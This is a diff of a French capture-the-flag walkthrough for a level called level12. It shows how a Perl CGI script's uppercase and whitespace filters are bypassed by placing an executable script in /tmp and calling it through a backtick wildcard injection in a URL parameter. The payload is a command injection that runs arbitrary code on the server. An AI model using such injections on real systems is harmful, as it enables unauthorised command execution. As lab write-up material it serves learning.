@@ -1,4 +1,4 @@
-On trouve dans le dossier **home** un fichier **level12.pl** qui contient:
+On trouve dans le dossier **home** un fichier **level12.pl** qui contient :
 
 ```perl
 #!/usr/bin/env perl
@@ -31,12 +31,12 @@ sub n {
 ```
 On remarque dans le code qu'il y a des "sécurités" par rapport au paramètre **x**, ce dernier devant être en majuscule et sans [\s\t\r\n].
 On essaie donc de passer au travers de ces sécurités en créant un fichier dans **/tmp** en majuscule et en utilisant les wildcards.
-On vérifie les droits:
+On vérifie les droits :
 
 <pre><code>> echo "whoami > /tmp/test" > /tmp/SCRIPT
 > chmod 777 /tmp/SCRIPT
 </code></pre>
-> Le chmod est important car on doit pouvoir exécuter /tmp/SCRIPT sans utiliser <code>sh</code>
+> Le **chmod** est important car on doit pouvoir exécuter /tmp/SCRIPT sans utiliser <code>sh</code>
 
 Par la suite on va utilser la faille en allant sur :
 <pre>http://IP:4646/?x=`/*/SCRIPT`</pre>
